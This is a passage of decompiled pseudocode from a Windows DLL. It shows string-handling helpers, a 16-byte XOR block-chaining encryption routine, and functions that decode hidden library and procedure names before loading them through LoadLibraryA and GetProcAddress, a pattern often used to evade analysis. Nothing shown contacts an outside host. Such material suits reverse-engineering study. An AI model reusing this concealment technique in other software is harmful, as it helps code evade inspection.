    "      sub_10001540();",
    "    v7 = Size | 0xF;",
    "    if ( (Size | 0xF) > 0x7FFFFFFF || (v8 = v4 >> 1, v4 > 0x7FFFFFFF - (v4 >> 1)) )",
    "    {",
    "      v7 = 0x7FFFFFFF;",
    "      v10 = -2147483613;",
    "    }",
    "    else",
    "    {",
    "      if ( v7 < v8 + v4 )",
    "        v7 = v8 + v4;",
    "      if ( v7 == -1 )",
    "      {",
    "        v9 = 0;",
    "        goto LABEL_19;",
    "      }",
    "      if ( v7 + 1 < 0x1000 )",
    "      {",
    "        v9 = operator new(v7 + 1);",
    "        goto LABEL_19;",
    "      }",
    "      v10 = v7 + 36;",
    "      if ( v7 + 36 < v7 + 1 )",
    "        sub_100014A0();",
    "    }",
    "    v11 = operator new(v10);",
    "    v12 = v11;",
    "    if ( !v11 )",
    "      goto LABEL_25;",
    "    v9 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);",
    "    *(v9 - 1) = v12;",
    "LABEL_19:",
    "    v15 = v9;",
    "    this[4] = (void *)Size;",
    "    this[5] = (void *)v7;",
    "    memmove(v9, Src, Size);",
    "    *((_BYTE *)v15 + Size) = 0;",
    "    if ( v14 <= 0xF )",
    "    {",
    "LABEL_24:",
    "      *this = v15;",
    "      return this;",
    "    }",
    "    v13 = *this;",
    "    if ( v14 + 1 < 0x1000 )",
    "    {",
    "LABEL_23:",
    "      sub_100154EB(v13);",
    "      goto LABEL_24;",
    "    }",
    "    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )",
    "    {",
    "      v13 = (void *)*((_DWORD *)v13 - 1);",
    "      goto LABEL_23;",
    "    }",
    "LABEL_25:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v5 = this;",
    "  if ( v4 > 0xF )",
    "    v5 = *this;",
    "  this[4] = (void *)Size;",
    "  memmove(v5, Src, Size);",
    "  *((_BYTE *)v5 + Size) = 0;",
    "  return this;",
    "}",
    "",
    "",
    "int sub_100031E0()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_1004089C;",
    "  if ( !dword_1004089C )",
    "  {",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FB00) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FB2C == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FB2C = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    if ( !dword_1004089C )",
    "      dword_1004089C = (int)operator new(1u);",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FB00);",
    "    return dword_1004089C;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10003290(_DWORD *a1, _DWORD *Src, int a3, int a4)",
    "{",
    "  _DWORD *v4; // edi",
    "  size_t v5; // esi",
    "  char *v6; // ebx",
    "  int v7; // esi",
    "  _BYTE *v8; // ecx",
    "  int v9; // edx",
    "  char v10; // al",
    "  char *v11; // edi",
    "  _BYTE *v12; // edi",
    "  _BYTE *v13; // eax",
    "  int v14; // edi",
    "  int v15; // edx",
    "  char v16; // cl",
    "  int v17; // ecx",
    "  int v18; // edx",
    "  char v19; // al",
    "  int v20; // ecx",
    "  char *v21; // ebx",
    "  int v22; // edx",
    "  char v23; // al",
    "  unsigned int v25; // [esp+14h] [ebp-24h]",
    "  int v26; // [esp+1Ch] [ebp-1Ch]",
    "  int v27; // [esp+20h] [ebp-18h]",
    "  unsigned __int8 v28; // [esp+27h] [ebp-11h]",
    "",
    "  v4 = Src;",
    "  if ( Src[5] > 0xFu )",
    "    v4 = (_DWORD *)*Src;",
    "  v5 = Src[4];",
    "  v26 = unknown_libname_6(2 * v5);",
    "  v27 = v5 - (v5 & 0xF) + 16;",
    "  v6 = (char *)unknown_libname_6(v27);",
    "  memmove(v6, v4, v5);",
    "  memset(&v6[v5], 0, 16 - (v5 & 0xF));",
    "  v28 = v27 & 0xF;",
    "  v7 = v26;",
    "  v8 = (_BYTE *)v26;",
    "  v9 = 16;",
    "  do",
    "  {",
    "    v10 = v6[(_DWORD)v8++ - v26];",
    "    *(v8 - 1) = v10;",
    "    --v9;",
    "  }",
    "  while ( v9 );",
    "  v11 = (char *)v26;",
    "  dword_100408CC = (int)&byte_1003FB40;",
    "  dword_100408C8 = v26;",
    "  sub_10001030();",
    "  dword_10040980 = (int)&unk_1003FB30;",
    "  if ( v27 )",
    "  {",
    "    v12 = &unk_1003FB30;",
    "    v25 = ((unsigned int)(v27 - 1) >> 4) + 1;",
    "    do",
    "    {",
    "      v13 = v6;",
    "      v14 = v12 - v6;",
    "      v15 = 16;",
    "      do",
    "      {",
    "        v16 = v13[v14];",
    "        *v13++ ^= v16;",
    "        --v15;",
    "      }",
    "      while ( v15 );",
    "      v17 = v7;",
    "      v18 = 16;",
    "      do",
    "      {",
    "        v19 = v6[v17++ - v7];",
    "        *(_BYTE *)(v17 - 1) = v19;",
    "        --v18;",
    "      }",
    "      while ( v18 );",
    "      dword_100408C8 = v7;",
    "      sub_100011A0();",
    "      v12 = (_BYTE *)v7;",
    "      v6 += 16;",
    "      dword_10040980 = v7;",
    "      v7 += 16;",
    "      --v25;",
    "    }",
    "    while ( v25 );",
    "    v11 = (char *)v26;",
    "  }",
    "  if ( v28 )",
    "  {",
    "    v20 = v7;",
    "    v21 = &v6[-v7];",
    "    v22 = 16;",
    "    do",
    "    {",
    "      v23 = v21[v20++];",
    "      *(_BYTE *)(v20 - 1) = v23;",
    "      --v22;",
    "    }",
    "    while ( v22 );",
    "    memset((void *)(v7 + v28), 0, 16 - v28);",
    "    dword_100408C8 = v7;",
    "    sub_100011A0();",
    "  }",
    "  sub_10001550(a1, v11, v27);",
    "  return a1;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10003490(_DWORD *this)",
    "{",
    "  if ( this[5] <= 0xFu )",
    "    return this;",
    "  else",
    "    return (_DWORD *)*this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_100034A0(_DWORD *this, _QWORD *a2)",
    "{",
    "  unsigned int v3; // ecx",
    "  _DWORD *v4; // eax",
    "",
    "  if ( this != (_DWORD *)a2 )",
    "  {",
    "    v3 = this[5];",
    "    if ( v3 > 0xF )",
    "    {",
    "      v4 = (_DWORD *)*this;",
    "      if ( v3 + 1 >= 0x1000 )",
    "      {",
    "        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "        v4 = (_DWORD *)*(v4 - 1);",
    "      }",
    "      sub_100154EB(v4);",
    "    }",
    "    this[4] = 0;",
    "    this[5] = 15;",
    "    *(_BYTE *)this = 0;",
    "    *(_OWORD *)this = *(_OWORD *)a2;",
    "    *((_QWORD *)this + 2) = a2[2];",
    "    *((_DWORD *)a2 + 4) = 0;",
    "    *((_DWORD *)a2 + 5) = 15;",
    "    *(_BYTE *)a2 = 0;",
    "  }",
    "  return this;",
    "}",
    "",
    "",
    "void  sub_10003520()",
    "{",
    "  sub_10014CF2(\"invalid string position\");",
    "}",
    "",
    "",
    "void  sub_10003530()",
    "{",
    "  sub_10014CD2(\"vector too long\");",
    "}",
    "",
    "",
    "void *sub_10003540()",
    "{",
    "  return &unk_10040988;",
    "}",
    "",
    "",
    "int sub_10003550(char *Buffer, size_t BufferCount, char *Format, ...)",
    "{",
    "  _DWORD *v3; // eax",
    "  int result; // eax",
    "  unsigned __int64 v5; // [esp-1Ch] [ebp-1Ch]",
    "  va_list va; // [esp+14h] [ebp+14h] BYREF",
    "",
    "  va_start(va, Format);",
    "  v3 = sub_10003540();",
    "  HIDWORD(v5) = v3[1];",
    "  LODWORD(v5) = *v3 | 2;",
    "  result = __stdio_common_vsprintf(v5, Buffer, BufferCount, Format, 0, va);",
    "  if ( result < 0 )",
    "    return -1;",
    "  return result;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10003590(_DWORD *a1)",
    "{",
    "  const CHAR *v1; // ecx",
    "  const WCHAR *v2; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v4; // eax",
    "  CHAR *v5; // edx",
    "  const CHAR *v6; // ecx",
    "  WCHAR *v7; // edx",
    "  const CHAR *v8; // ecx",
    "  CHAR *v9; // edx",
    "  const CHAR *v10; // ecx",
    "  void **v12; // eax",
    "  void (__stdcall *v13)(unsigned __int16 *, int *); // eax",
    "  void *v14; // edx",
    "  const CHAR *v15; // ecx",
    "  unsigned int v16; // ecx",
    "  __int128 v17; // xmm0",
    "  void *v18; // edx",
    "  const CHAR *v19; // ecx",
    "  CHAR *v20; // edx",
    "  const CHAR *v21; // ecx",
    "  WCHAR *v22; // edx",
    "  const CHAR *v23; // ecx",
    "  void *v24; // [esp-30h] [ebp-104h]",
    "  void *v25; // [esp-30h] [ebp-104h]",
    "  void *v26; // [esp-30h] [ebp-104h]",
    "  void *v27; // [esp-30h] [ebp-104h]",
    "  void *v28; // [esp-30h] [ebp-104h]",
    "  void *v29; // [esp-30h] [ebp-104h]",
    "  int v30; // [esp-2Ch] [ebp-100h]",
    "  int v31; // [esp-2Ch] [ebp-100h]",
    "  int v32; // [esp-2Ch] [ebp-100h]",
    "  int v33; // [esp-2Ch] [ebp-100h]",
    "  int v34; // [esp-2Ch] [ebp-100h]",
    "  int v35; // [esp-2Ch] [ebp-100h]",
    "  int v36; // [esp-28h] [ebp-FCh]",
    "  int v37; // [esp-28h] [ebp-FCh]",
    "  int v38; // [esp-28h] [ebp-FCh]",
    "  int v39; // [esp-28h] [ebp-FCh]",
    "  int v40; // [esp-28h] [ebp-FCh]",
    "  int v41; // [esp-28h] [ebp-FCh]",
    "  int v42; // [esp-24h] [ebp-F8h]",
    "  int v43; // [esp-24h] [ebp-F8h]",
    "  int v44; // [esp-24h] [ebp-F8h]",
    "  int v45; // [esp-24h] [ebp-F8h]",
    "  int v46; // [esp-24h] [ebp-F8h]",
    "  int v47; // [esp-24h] [ebp-F8h]",
    "  int v48; // [esp-20h] [ebp-F4h]",
    "  int v49; // [esp-20h] [ebp-F4h]",
    "  int v50; // [esp-20h] [ebp-F4h]",
    "  int v51; // [esp-20h] [ebp-F4h]",
    "  int v52; // [esp-20h] [ebp-F4h]",
    "  int v53; // [esp-20h] [ebp-F4h]",
    "  int v54; // [esp-1Ch] [ebp-F0h]",
    "  int v55; // [esp-1Ch] [ebp-F0h]",
    "  int v56; // [esp-1Ch] [ebp-F0h]",
    "  int v57; // [esp-1Ch] [ebp-F0h]",
    "  int v58; // [esp-1Ch] [ebp-F0h]",
    "  int v59; // [esp-1Ch] [ebp-F0h]",
    "  void *v60; // [esp-18h] [ebp-ECh] BYREF",
    "  int v61; // [esp-14h] [ebp-E8h]",
    "  int v62; // [esp-10h] [ebp-E4h]",
    "  int v63; // [esp-Ch] [ebp-E0h]",
    "  void *v64; // [esp-8h] [ebp-DCh]",
    "  LPCSTR v65; // [esp-4h] [ebp-D8h]",
    "  int v66; // [esp+0h] [ebp-D4h]",
    "  int v67; // [esp+4h] [ebp-D0h]",
    "  void **v68; // [esp+Ch] [ebp-C8h]",
    "  FARPROC ProcAddress; // [esp+18h] [ebp-BCh]",
    "  HMODULE LibraryA; // [esp+1Ch] [ebp-B8h]",
    "  int v71; // [esp+20h] [ebp-B4h]",
    "  int v72[4]; // [esp+24h] [ebp-B0h] BYREF",
    "  __int64 v73; // [esp+34h] [ebp-A0h]",
    "  LPCSTR lpLibFileName[5]; // [esp+3Ch] [ebp-98h] BYREF",
    "  unsigned int v75; // [esp+50h] [ebp-84h]",
    "  void *Block[4]; // [esp+54h] [ebp-80h] BYREF",
    "  int v77; // [esp+64h] [ebp-70h]",
    "  unsigned int v78; // [esp+68h] [ebp-6Ch]",
    "  LPCWSTR lpModuleName[4]; // [esp+6Ch] [ebp-68h] BYREF",
    "  int v80; // [esp+7Ch] [ebp-58h]",
    "  unsigned int v81; // [esp+80h] [ebp-54h]",
    "  LPCSTR lpProcName[4]; // [esp+84h] [ebp-50h] BYREF",
    "  int v83; // [esp+94h] [ebp-40h]",
    "  unsigned int v84; // [esp+98h] [ebp-3Ch]",
    "  int v85; // [esp+9Ch] [ebp-38h] BYREF",
    "  unsigned __int16 Src[18]; // [esp+A0h] [ebp-34h] BYREF",
    "  int v87; // [esp+D0h] [ebp-4h]",
    "",
    "  v85 = 18;",
    "  v71 = sub_10002FE0();",
    "  sub_1000A970(v66, v67);",
    "  ProcAddress = (FARPROC)&v60;",
    "  sub_10009E70(v71);",
    "  sub_1000B000(&v60, v24, v30, v36, v42, v48, v54);",
    "  v87 = 0;",
    "  sub_10009E70(v71 + 744);",
    "  v87 = -1;",
    "  sub_1000B970((int)lpLibFileName, v25, v31, v37, v43, v49, v55, v60, v61, v62, v63, (int)v64, (int)v65);",
    "  v87 = 1;",
    "  sub_10009E70(lpLibFileName);",
    "  sub_1000AA30((int)lpModuleName, (LPCCH)v60, v61, v62, v63, (int)v64, (int)v65);",
    "  LOBYTE(v87) = 2;",
    "  ProcAddress = (FARPROC)&v60;",
    "  sub_10009E70(v71 + 24);",
    "  sub_1000B000(&v60, v26, v32, v38, v44, v50, v56);",
    "  LOBYTE(v87) = 3;",
    "  sub_10009E70(v71 + 768);",
    "  LOBYTE(v87) = 2;",
    "  sub_1000B970((int)lpProcName, v27, v33, v39, v45, v51, v57, v60, v61, v62, v63, (int)v64, (int)v65);",
    "  LOBYTE(v87) = 4;",
    "  v1 = (const CHAR *)lpProcName;",
    "  v2 = (const WCHAR *)lpModuleName;",
    "  if ( v84 > 0xF )",
    "    v1 = lpProcName[0];",
    "  v65 = v1;",
    "  if ( v81 > 7 )",
    "    v2 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v2);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v65);",
    "  v4 = (const CHAR *)lpLibFileName;",
    "  if ( v75 > 0xF )",
    "    v4 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v4);",
    "  if ( LibraryA )",
    "  {",
    "    v68 = &v60;",
    "    sub_10009E70(v71 + 168);",
    "    sub_1000B000(&v60, v28, v34, v40, v46, v52, v58);",
    "    LOBYTE(v87) = 5;",
    "    sub_10009E70(v71 + 912);",
    "    LOBYTE(v87) = 4;",
    "    sub_1000B970((int)Block, v29, v35, v41, v47, v53, v59, v60, v61, v62, v63, (int)v64, (int)v65);",
    "    LOBYTE(v87) = 6;",
    "    v12 = Block;",
    "    if ( v78 > 0xF )",
    "      v12 = (void **)Block[0];",
    "    v13 = (void (__stdcall *)(unsigned __int16 *, int *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                           LibraryA,",
    "                                                           v12);",
    "    if ( v13 )",
    "      v13(Src, &v85);",
    "    LOBYTE(v87) = 4;",
    "    if ( v78 > 0xF )",
    "    {",
    "      v14 = Block[0];",
    "      v15 = (const CHAR *)(v78 + 1);",
    "      if ( v78 + 1 >= 0x1000 )",
    "      {",
    "        v14 = (void *)*((_DWORD *)Block[0] - 1);",
    "        v15 = (const CHAR *)(v78 + 36);",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v14 - 4) > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      v65 = v15;",
    "      sub_100154EB(v14);",
    "    }",
    "    v77 = 0;",
    "    v78 = 0;",
    "    *(_OWORD *)Block = 0;",
    "    sub_1000A170(Block, Src, wcslen(Src));",
    "    LOBYTE(v87) = 7;",
    "    sub_10009D70(Block);",
    "    sub_1000AD50((int)v72, (LPCWCH)v60, v61, v62, v63, (int)v64, (int)v65);",
    "    v16 = v78;",
    "    *(_OWORD *)a1 = 0;",
    "    a1[4] = 0;",
    "    a1[5] = 0;",
    "    v17 = *(_OWORD *)v72;",
    "    LOBYTE(v72[0]) = 0;",
    "    *(_OWORD *)a1 = v17;",
    "    *((_QWORD *)a1 + 2) = v73;",
    "    v73 = 0xF00000000LL;",
    "    if ( v16 > 7 )",
    "    {",
    "      v18 = Block[0];",
    "      v19 = (const CHAR *)(2 * v16 + 2);",
    "      if ( (unsigned int)v19 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)Block[0] - 1);",
    "        v19 += 35;",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_44;",
    "      }",
    "      v65 = v19;",
    "      sub_100154EB(v18);",
    "    }",
    "    if ( v84 > 0xF )",
    "    {",
    "      v20 = (CHAR *)lpProcName[0];",
    "      v21 = (const CHAR *)(v84 + 1);",
    "      if ( v84 + 1 >= 0x1000 )",
    "      {",
    "        v20 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v21 = (const CHAR *)(v84 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v20 - 4) > 0x1F )",
    "          goto LABEL_44;",
    "      }",
    "      v65 = v21;",
    "      sub_100154EB(v20);",
    "    }",
    "    v83 = 0;",
    "    v84 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v81 > 7 )",
    "    {",
    "      v22 = (WCHAR *)lpModuleName[0];",
    "      v23 = (const CHAR *)(2 * v81 + 2);",
    "      if ( (unsigned int)v23 >= 0x1000 )",
    "      {",
    "        v22 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v23 = (const CHAR *)(2 * v81 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v22 - 4) > 0x1F )",
    "          goto LABEL_44;",
    "      }",
    "      v65 = v23;",
    "      sub_100154EB(v22);",
    "    }",
    "    v80 = 0;",
    "    v81 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v75 <= 0xF )",
    "      return a1;",
    "    v9 = (CHAR *)lpLibFileName[0];",
    "    v10 = (const CHAR *)(v75 + 1);",
    "    if ( v75 + 1 < 0x1000 )",
    "      goto LABEL_19;",
    "    v9 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "    v10 = (const CHAR *)(v75 + 36);",
    "    if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v9 - 4) <= 0x1F )",
    "      goto LABEL_19;",
    "LABEL_44:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v65 = 0;",
    "  *(_OWORD *)a1 = 0;",
    "  v64 = &unk_1003B3A1;",
    "  a1[4] = 0;",
    "  a1[5] = 0;",
    "  sub_100018C0(a1, v64, (size_t)v65);",
    "  if ( v84 > 0xF )",
    "  {",
    "    v5 = (CHAR *)lpProcName[0];",
    "    v6 = (const CHAR *)(v84 + 1);",
    "    if ( v84 + 1 >= 0x1000 )",
    "    {",
    "      v5 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v6 = (const CHAR *)(v84 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v5 - 4) > 0x1F )",
    "        goto LABEL_44;",
    "    }",
    "    v65 = v6;",
    "    sub_100154EB(v5);",
    "  }",
    "  v83 = 0;",
    "  v84 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v81 > 7 )",
    "  {",
    "    v7 = (WCHAR *)lpModuleName[0];",
    "    v8 = (const CHAR *)(2 * v81 + 2);",
    "    if ( (unsigned int)v8 >= 0x1000 )",
    "    {",
    "      v7 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v8 = (const CHAR *)(2 * v81 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v7 - 4) > 0x1F )",
    "        goto LABEL_44;",
    "    }",
    "    v65 = v8;",
    "    sub_100154EB(v7);",
    "  }",
    "  v80 = 0;",
    "  v81 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v75 > 0xF )",
    "  {",
    "    v9 = (CHAR *)lpLibFileName[0];",
    "    v10 = (const CHAR *)(v75 + 1);",
    "    if ( v75 + 1 < 0x1000",
    "      || (v9 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1),",
    "          v10 = (const CHAR *)(v75 + 36),",
    "          (unsigned int)(lpLibFileName[0] - (LPCSTR)v9 - 4) <= 0x1F) )",
    "    {",
    "LABEL_19:",
    "      v65 = v10;",
    "      sub_100154EB(v9);",
    "      return a1;",
    "    }",
    "    goto LABEL_44;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10003A60(_DWORD *a1)",
    "{",
    "  const WCHAR *v1; // ecx",
    "  const CHAR *v2; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v4; // eax",
    "  _BYTE *v5; // edx",
    "  const CHAR *v6; // ecx",
    "  CHAR *v7; // edx",
    "  const CHAR *v8; // ecx",
    "  CHAR *v9; // edx",
    "  const CHAR *v10; // ecx",
    "  WCHAR *v11; // edx",
    "  const CHAR *v12; // ecx",
    "  void *v13; // edx",
    "  const CHAR *v14; // ecx",
    "  void **v16; // eax",
    "  void (__stdcall *v17)(unsigned __int16 *, int *); // eax",
    "  void *v18; // edx",
    "  const CHAR *v19; // ecx",
    "  unsigned int v20; // ecx",
    "  __int128 v21; // xmm0",
    "  void *v22; // edx",
    "  const CHAR *v23; // ecx",
    "  _BYTE *v24; // edx",
    "  const CHAR *v25; // ecx",
    "  CHAR *v26; // edx",
    "  const CHAR *v27; // ecx",
    "  CHAR *v28; // edx",
    "  const CHAR *v29; // ecx",
    "  WCHAR *v30; // edx",
    "  const CHAR *v31; // ecx",
    "  void *v32; // [esp-30h] [ebp-134h]",
    "  void *v33; // [esp-30h] [ebp-134h]",
    "  void *v34; // [esp-30h] [ebp-134h]",
    "  void *v35; // [esp-30h] [ebp-134h]",
    "  void *v36; // [esp-30h] [ebp-134h]",
    "  void *v37; // [esp-30h] [ebp-134h]",
    "  void *v38; // [esp-30h] [ebp-134h]",
    "  void *v39; // [esp-30h] [ebp-134h]",
    "  int v40; // [esp-2Ch] [ebp-130h]",
    "  int v41; // [esp-2Ch] [ebp-130h]",
    "  int v42; // [esp-2Ch] [ebp-130h]",
    "  int v43; // [esp-2Ch] [ebp-130h]",
    "  int v44; // [esp-2Ch] [ebp-130h]",
    "  int v45; // [esp-2Ch] [ebp-130h]",
    "  int v46; // [esp-2Ch] [ebp-130h]",
    "  int v47; // [esp-2Ch] [ebp-130h]",
    "  int v48; // [esp-28h] [ebp-12Ch]",
    "  int v49; // [esp-28h] [ebp-12Ch]",
    "  int v50; // [esp-28h] [ebp-12Ch]",
    "  int v51; // [esp-28h] [ebp-12Ch]",
    "  int v52; // [esp-28h] [ebp-12Ch]",
    "  int v53; // [esp-28h] [ebp-12Ch]",
    "  int v54; // [esp-28h] [ebp-12Ch]",
    "  int v55; // [esp-28h] [ebp-12Ch]",
    "  int v56; // [esp-24h] [ebp-128h]",
    "  int v57; // [esp-24h] [ebp-128h]",
    "  int v58; // [esp-24h] [ebp-128h]",
    "  int v59; // [esp-24h] [ebp-128h]",
    "  int v60; // [esp-24h] [ebp-128h]",
    "  int v61; // [esp-24h] [ebp-128h]",
    "  int v62; // [esp-24h] [ebp-128h]",
    "  int v63; // [esp-24h] [ebp-128h]",
    "  int v64; // [esp-20h] [ebp-124h]",
    "  int v65; // [esp-20h] [ebp-124h]",
    "  int v66; // [esp-20h] [ebp-124h]",
    "  int v67; // [esp-20h] [ebp-124h]",
    "  int v68; // [esp-20h] [ebp-124h]",
    "  int v69; // [esp-20h] [ebp-124h]",
    "  int v70; // [esp-20h] [ebp-124h]",
    "  int v71; // [esp-20h] [ebp-124h]",
    "  int v72; // [esp-1Ch] [ebp-120h]",
    "  int v73; // [esp-1Ch] [ebp-120h]",
    "  int v74; // [esp-1Ch] [ebp-120h]",
    "  int v75; // [esp-1Ch] [ebp-120h]",
    "  int v76; // [esp-1Ch] [ebp-120h]",
    "  int v77; // [esp-1Ch] [ebp-120h]",
    "  int v78; // [esp-1Ch] [ebp-120h]",
    "  int v79; // [esp-1Ch] [ebp-120h]",
    "  void *v80; // [esp-18h] [ebp-11Ch] BYREF",
    "  int v81; // [esp-14h] [ebp-118h]",
    "  int v82; // [esp-10h] [ebp-114h]",
    "  int v83; // [esp-Ch] [ebp-110h]",
    "  void *v84; // [esp-8h] [ebp-10Ch]",
    "  LPCSTR v85; // [esp-4h] [ebp-108h]",
    "  int v86; // [esp+0h] [ebp-104h]",
    "  int v87; // [esp+4h] [ebp-100h]",
    "  void **v88; // [esp+Ch] [ebp-F8h]",
    "  FARPROC ProcAddress; // [esp+18h] [ebp-ECh]",
    "  HMODULE LibraryA; // [esp+1Ch] [ebp-E8h]",
    "  int v91; // [esp+20h] [ebp-E4h]",
    "  void *v92[5]; // [esp+24h] [ebp-E0h] BYREF",
    "  unsigned int v93; // [esp+38h] [ebp-CCh]",
    "  int v94[4]; // [esp+3Ch] [ebp-C8h] BYREF",
    "  __int64 v95; // [esp+4Ch] [ebp-B8h]",
    "  void *Block; // [esp+54h] [ebp-B0h] BYREF",
    "  int v97; // [esp+64h] [ebp-A0h]",
    "  unsigned int v98; // [esp+68h] [ebp-9Ch]",
    "  void *v99[4]; // [esp+6Ch] [ebp-98h] BYREF",
    "  int v100; // [esp+7Ch] [ebp-88h]",
    "  unsigned int v101; // [esp+80h] [ebp-84h]",
    "  LPCWSTR lpModuleName[4]; // [esp+84h] [ebp-80h] BYREF",
    "  int v103; // [esp+94h] [ebp-70h]",
    "  unsigned int v104; // [esp+98h] [ebp-6Ch]",
    "  LPCSTR lpProcName[4]; // [esp+9Ch] [ebp-68h] BYREF",
    "  int v106; // [esp+ACh] [ebp-58h]",
    "  unsigned int v107; // [esp+B0h] [ebp-54h]",
    "  LPCSTR lpLibFileName[4]; // [esp+B4h] [ebp-50h] BYREF",
    "  int v109; // [esp+C4h] [ebp-40h]",
    "  unsigned int v110; // [esp+C8h] [ebp-3Ch]",
    "  int v111; // [esp+CCh] [ebp-38h] BYREF",
    "  unsigned __int16 Src[18]; // [esp+D0h] [ebp-34h] BYREF",
    "  int v113; // [esp+100h] [ebp-4h]",
    "",
    "  v111 = 18;",
    "  v91 = sub_10002FE0();",
    "  sub_1000A970(v86, v87);",
    "  ProcAddress = (FARPROC)&v80;",
    "  sub_10009E70(v91);",
    "  sub_1000B000(&v80, v32, v40, v48, v56, v64, v72);",
    "  v113 = 0;",
    "  sub_10009E70(v91 + 744);",
    "  v113 = -1;",
    "  sub_1000B970((int)v92, v33, v41, v49, v57, v65, v73, v80, v81, v82, v83, (int)v84, (int)v85);",
    "  v113 = 1;",
    "  sub_10009E70(v92);",
    "  sub_1000AA30((int)lpModuleName, (LPCCH)v80, v81, v82, v83, (int)v84, (int)v85);",
    "  LOBYTE(v113) = 2;",
    "  ProcAddress = (FARPROC)&v80;",
    "  sub_10009E70(v91 + 24);",
    "  sub_1000B000(&v80, v34, v42, v50, v58, v66, v74);",
    "  LOBYTE(v113) = 3;",
    "  sub_10009E70(v91 + 768);",
    "  LOBYTE(v113) = 2;",
    "  sub_1000B970((int)lpProcName, v35, v43, v51, v59, v67, v75, v80, v81, v82, v83, (int)v84, (int)v85);",
    "  LOBYTE(v113) = 4;",
    "  ProcAddress = (FARPROC)&v80;",
    "  sub_10009E70(v91 + 216);",
    "  sub_1000B000(&v80, v36, v44, v52, v60, v68, v76);",
    "  LOBYTE(v113) = 5;",
    "  sub_10009E70(v91 + 960);",
    "  LOBYTE(v113) = 4;",
    "  sub_1000B970((int)lpLibFileName, v37, v45, v53, v61, v69, v77, v80, v81, v82, v83, (int)v84, (int)v85);",
    "  LOBYTE(v113) = 6;",
    "  sub_10009E70(lpLibFileName);",
    "  sub_1000AA30((int)&Block, (LPCCH)v80, v81, v82, v83, (int)v84, (int)v85);",
    "  LOBYTE(v113) = 7;",
    "  v1 = (const WCHAR *)lpModuleName;",
    "  v2 = (const CHAR *)lpProcName;",
    "  if ( v104 > 7 )",
    "    v1 = lpModuleName[0];",
    "  if ( v107 > 0xF )",
    "    v2 = lpProcName[0];",
    "  v85 = v2;",
    "  ModuleHandleW = GetModuleHandleW(v1);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v85);",
    "  v4 = (const CHAR *)lpLibFileName;",
    "  if ( v110 > 0xF )",
    "    v4 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v4);",
    "  if ( LibraryA )",
    "  {",
    "    v88 = &v80;",
    "    sub_10009E70(v91 + 192);",
    "    sub_1000B000(&v80, v38, v46, v54, v62, v70, v78);",
    "    LOBYTE(v113) = 8;",
    "    sub_10009E70(v91 + 936);",
    "    LOBYTE(v113) = 7;",
    "    sub_1000B970((int)v99, v39, v47, v55, v63, v71, v79, v80, v81, v82, v83, (int)v84, (int)v85);",
    "    LOBYTE(v113) = 9;",
    "    v16 = v99;",
    "    if ( v101 > 0xF )",
    "      v16 = (void **)v99[0];",
    "    v17 = (void (__stdcall *)(unsigned __int16 *, int *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                           LibraryA,",
    "                                                           v16);",
    "    if ( v17 )",
    "      v17(Src, &v111);",
    "    LOBYTE(v113) = 7;",
    "    if ( v101 > 0xF )",
    "    {",
    "      v18 = v99[0];",
    "      v19 = (const CHAR *)(v101 + 1);",
    "      if ( v101 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)v99[0] - 1);",
    "        v19 = (const CHAR *)(v101 + 36);",
    "        if ( (unsigned int)((char *)v99[0] - (char *)v18 - 4) > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      v85 = v19;",
    "      sub_100154EB(v18);",
    "    }",
    "    v100 = 0;",
    "    v101 = 0;",
    "    *(_OWORD *)v99 = 0;",
    "    sub_1000A170(v99, Src, wcslen(Src));",
    "    LOBYTE(v113) = 10;",
    "    sub_10009D70(v99);",
